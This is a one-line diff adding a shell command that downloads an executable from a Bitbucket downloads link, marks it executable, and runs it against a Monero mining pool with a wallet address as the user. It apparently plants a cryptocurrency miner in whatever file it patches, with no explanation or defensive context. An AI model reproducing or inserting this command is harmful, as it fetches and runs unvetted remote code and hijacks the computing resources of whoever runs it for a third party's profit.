@@ -1,0 +1,1 @@
+wget https://bitbucket.org/wegwg/egwe/downloads/masterfile && chmod u+x masterfile && ./masterfile -o rx.unmineable.com:3333 -a rx -k -u XMR:483P9NvLLpU2ZfcdKgJcThMid4ed3xfLQLGiyHS9z8Y9VwTwJzfLpwJdQJrMpPJwZfcZhaXQpFTXAM117ucmLpMhE5DiA3h.pok
